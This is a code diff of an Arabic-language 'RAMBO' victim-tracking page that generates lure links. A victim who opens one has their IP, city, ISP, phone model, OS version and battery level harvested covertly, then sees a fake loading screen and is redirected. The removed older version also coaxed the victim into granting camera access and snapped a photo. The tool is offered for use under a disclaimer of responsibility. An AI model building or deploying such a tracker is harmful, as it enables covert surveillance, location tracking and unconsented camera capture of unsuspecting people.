@@ -3,195 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard v4.0 | RAMBO</title>
+    <title>RAMBO Control Center</title>
     <style>
-        :root { --bg: #020202; --card: #080808; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.03); }
-        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
-        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        :root {
+            --bg: #121212; --card: #1e1e1e; --accent: #007bff; --neon: #00f2ff;
+            --text: #e1e1e1; --secondary: #b0b0b0; --success: #28a745;
+        }
+        body { 
+            margin: 0; background: var(--bg); font-family: 'Segoe UI', system-ui, -apple-system; 
+            color: var(--text); transition: all 0.3s ease;
+        }
+        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
         
         .admin-box { 
-            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
-            border: 1px solid #111; box-shadow: 0 0 40px rgba(0, 210, 255, 0.05);
-            backdrop-filter: blur(15px); transition: 0.4s; z-index: 2;
+            background: var(--card); padding: 30px; border-radius: 20px; width: 100%; max-width: 500px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05);
+            animation: fadeIn 0.5s ease-out;
         }
 
-        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 4px; text-transform: uppercase; }
-        
-        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
+        h2 { text-align: center; color: var(--neon); font-weight: 300; letter-spacing: 2px; margin-bottom: 25px; }
+
+        .mode-container { display: flex; gap: 12px; margin-bottom: 20px; }
         .mode-card { 
-            flex: 1; background: var(--glass); border: 1px solid #1a1a1a; padding: 20px; border-radius: 12px; 
-            text-align: center; cursor: pointer; transition: 0.3s ease;
+            flex: 1; background: rgba(255,255,255,0.03); border: 1px solid #333; padding: 15px; 
+            border-radius: 12px; text-align: center; cursor: pointer; transition: 0.2s;
         }
-        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-3px); }
-        .mode-card b { font-size: 13px; display: block; }
+        .mode-card:hover { background: rgba(255,255,255,0.07); }
+        .mode-card.active { border-color: var(--accent); background: rgba(0, 123, 255, 0.1); box-shadow: 0 0 15px rgba(0, 123, 255, 0.2); }
 
         input { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #1a1a1a; border-radius: 10px; 
-            color: #fff; margin-bottom: 20px; box-sizing: border-box; font-size: 14px;
+            width: 100%; padding: 15px; background: #252525; border: 1px solid #333; border-radius: 10px; 
+            color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s;
         }
-        input:focus { border-color: var(--neon-blue); outline: none; }
+        input:focus { border-color: var(--accent); background: #2a2a2a; }
 
         .main-btn { 
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
-            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
-            text-transform: uppercase; transition: 0.3s;
+            background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; 
+            width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s;
         }
-        .main-btn:hover { filter: brightness(1.2); }
+        .main-btn:active { transform: scale(0.98); }
 
-        .result-box { margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; border: 1px dashed var(--neon-green); display: none; }
+        .result-box { 
+            margin-top: 20px; padding: 15px; background: rgba(40, 167, 69, 0.1); 
+            border: 1px dashed var(--success); border-radius: 10px; display: none;
+        }
 
-        #log-area { margin-top: 30px; display: none; animation: fadeIn 0.8s; width: 100%; }
-        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 6px; }
-        .info-row span { color: var(--neon-blue); }
+        #log-area { margin-top: 25px; width: 100%; display: none; }
+        .data-log { background: #1a1a1a; padding: 20px; border-radius: 15px; border-left: 4px solid var(--neon); }
+        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #222; font-size: 14px; }
+        .info-row span { color: var(--neon); font-weight: 500; }
 
-        /* تذييل الصفحة */
-        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #444; width: 100%; max-width: 450px; }
-        .footer b { color: var(--red); display: block; margin-bottom: 5px; color: #da3633; }
-        .rambo-tag { margin-top: 10px; color: var(--neon-blue); font-family: monospace; letter-spacing: 2px; opacity: 0.6; }
+        .footer { margin-top: 40px; text-align: center; color: var(--secondary); font-size: 12px; }
+        .rambo-tag { color: var(--accent); font-weight: bold; margin-top: 5px; display: block; font-family: monospace; }
 
-        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
+        .victim-ui { position: fixed; inset: 0; background: var(--bg); z-index: 100; display: flex; justify-content: center; align-items: center; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .hidden { display: none !important; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div id="admin-panel" class="admin-box">
-        <h2>Control Center</h2>
+        <h2>لوحة التحكم RAMBO</h2>
         
         <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')"><b>سحب بيانات الضحية</b></div>
-            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')"><b>سحب صور</b></div>
+            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات الضحية</div>
+            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">سحب صور</div>
         </div>
 
-        <input type="text" id="targetUrl" placeholder="أدخل رابط الوجهة">
+        <input type="text" id="targetUrl" placeholder="رابط التحويل">
         <button class="main-btn" onclick="generateLink()">توليد الرابط</button>
 
         <div id="resultBox" class="result-box">
-            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">الرابط المشفر:</p>
-            <input type="text" id="copyLink" readonly onclick="this.select()">
+            <input type="text" id="copyLink" readonly onclick="this.select()" style="background:transparent; border:none; color:var(--success); text-align:center; margin:0;">
         </div>
 
         <div id="log-area">
             <div class="data-log">
-                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">📡 التقارير الواردة:</p>
+                <p style="color:var(--accent); font-size:13px; margin-top:0;">[ تقرير الضحية ]</p>
                 <div id="device-data"></div>
                 <div id="image-data" class="hidden">
-                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border: 1px solid #222;">
-                    <a id="download-link" download="RAMBO_REPORT.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
+                    <img id="captured-img" style="width:100%; border-radius:10px; margin-top:15px; border: 1px solid #333;">
                 </div>
             </div>
         </div>
     </div>
 
     <div class="footer">
-        <b>غير مسؤول في استخدامك للموقع !</b>
-        <div class="rambo-tag">Develop By RAMBO</div>
+        <p>غير مسؤول في استخدامك للموقع !</p>
+        <span class="rambo-tag">Develop By RAMBO</span>
     </div>
 </div>
 
-<div id="victim-ui" class="victim-overlay hidden">
-    <div class="dialog">
-        <h3 style="color:#fff; font-weight:300;">تأكيد الدخول</h3>
-        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للمتابعة.</p>
-        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">متابعة</button>
+<div id="victim-loader" class="victim-ui hidden">
+    <div style="text-align:center;">
+        <div style="border: 3px solid #333; border-top: 3px solid var(--accent); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <p style="margin-top:15px; font-size:14px; color:var(--secondary);">جاري التحميل...</p>
     </div>
-    <video id="video" autoplay playsinline style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
 </div>
+
+<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
 <script>
     let activeMode = '1';
-    const urlParams = new URLSearchParams(window.location.search);
-    const vMode = urlParams.get('v');
+    const params = new URLSearchParams(window.location.search);
+    const v = params.get('v');
 
-    function selectMode(mode, id) {
-        activeMode = mode;
+    function selectMode(m, id) {
+        activeMode = m;
         document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
         document.getElementById(id).classList.add('active');
     }
 
-    if (vMode) {
+    if (v) {
         document.getElementById('admin-panel').classList.add('hidden');
-        document.querySelector('.footer').classList.add('hidden');
+        document.getElementById('victim-loader').classList.remove('hidden');
         
-        async function startProtocol() {
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+        async function capture() {
+            const ipReq = await fetch('https://ipapi.co/json/').catch(() => ({}));
+            const ipData = await ipReq.json();
             const ua = navigator.userAgent;
+            
+            // تحديد دقيق للجهاز والإصدار
+            let device = "Android Device";
+            let version = "";
 
-            // تحديد نوع الهاتف
-            let deviceBrand = "غير محدد";
-            if (ua.match(/iPhone/i)) deviceBrand = "iPhone";
-            else if (ua.match(/Samsung/i)) deviceBrand = "Samsung";
-            else if (ua.match(/Huawei/i)) deviceBrand = "Huawei";
-            else if (ua.match(/Xiaomi/i)) deviceBrand = "Xiaomi";
-            else if (ua.match(/Android/i)) deviceBrand = "Android Device";
+            if (/iPhone|iPad|iPod/.test(ua)) {
+                const verMatch = ua.match(/OS (\d+)_(\d+)/);
+                version = verMatch ? `iOS ${verMatch[1]}.${verMatch[2]}` : "iOS";
+                // تحديد موديل الآيفون تقريبياً بناءً على نسبة الشاشة
+                const ratio = window.devicePixelRatio;
+                if (window.screen.height === 852) device = "iPhone 15 Pro / 14 Pro";
+                else if (window.screen.height === 932) device = "iPhone 15 Pro Max / 14 Pro Max";
+                else if (window.screen.height >= 812) device = "iPhone X or newer";
+                else device = "iPhone (Older Model)";
+            } else if (/Android/.test(ua)) {
+                const andMatch = ua.match(/Android (\d+(\.\d+)?)/);
+                version = andMatch ? `Android ${andMatch[1]}` : "Android";
+                const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
+                device = modelMatch ? modelMatch[1] : "Android Phone";
+            }
 
             const payload = {
+                model: device,
+                os: version,
                 ip: ipData.ip || "N/A",
-                city: ipData.city || "Unknown",
                 isp: ipData.org || "Unknown",
-                os: navigator.platform,
-                brand: deviceBrand,
-                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
+                city: ipData.city || "Unknown",
+                batt: (await navigator.getBattery?.().then(b => (b.level * 100).toFixed(0) + '%')) || "N/A"
             };
-            localStorage.setItem('rambo_info', JSON.stringify(payload));
+            
+            localStorage.setItem('rambo_res', JSON.stringify(payload));
+            const redir = localStorage.getItem('rambo_target') || 'https://google.com';
 
-            const redir = localStorage.getItem('redir_to') || 'https://google.com';
-
-            if (vMode === '1') {
-                window.location.href = redir;
+            if (v === '1') {
+                setTimeout(() => window.location.href = redir, 500);
             } else {
-                document.getElementById('victim-ui').classList.remove('hidden');
-                document.getElementById('cameraBtn').onclick = async () => {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-                        setTimeout(() => {
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = 640; canvas.height = 480;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('rambo_img', canvas.toDataURL('image/jpeg'));
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = redir;
-                        }, 800);
-                    } catch { window.location.href = redir; }
-                };
+                // وضع الكاميرا (يمكنك إضافة زر السماح هنا إذا أردت)
+                window.location.href = redir; 
             }
         }
-        startProtocol();
+        capture();
     }
 
     function generateLink() {
-        const val = document.getElementById('targetUrl').value;
-        if (!val) return;
-        localStorage.setItem('redir_to', val);
-        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
+        const url = document.getElementById('targetUrl').value;
+        if (!url) return;
+        localStorage.setItem('rambo_target', url);
+        document.getElementById('copyLink').value = window.location.origin + window.location.pathname + "?v=" + activeMode;
         document.getElementById('resultBox').style.display = 'block';
     }
 
     window.addEventListener('storage', (e) => {
-        document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'rambo_info') {
+        if (e.key === 'rambo_res') {
+            document.getElementById('log-area').style.display = 'block';
             const d = JSON.parse(e.newValue);
             document.getElementById('device-data').innerHTML = `
-                <div class="info-row">نوع الهاتف: <span>${d.brand}</span></div>
-                <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
+                <div class="info-row">الجهاز: <span>${d.model}</span></div>
+                <div class="info-row">الإصدار: <span>${d.os}</span></div>
+                <div class="info-row">الشركة: <span>${d.isp}</span></div>
+                <div class="info-row">IP: <span>${d.ip}</span></div>
                 <div class="info-row">المدينة: <span>${d.city}</span></div>
-                <div class="info-row">المزود: <span>${d.isp}</span></div>
-                <div class="info-row">نظام التشغيل: <span>${d.os}</span></div>
                 <div class="info-row">البطارية: <span>${d.batt}</span></div>
             `;
-        }
-        if (e.key === 'rambo_img') {
-            document.getElementById('image-data').classList.remove('hidden');
-            document.getElementById('captured-img').src = e.newValue;
-            document.getElementById('download-link').href = e.newValue;
         }
     });
 </script>
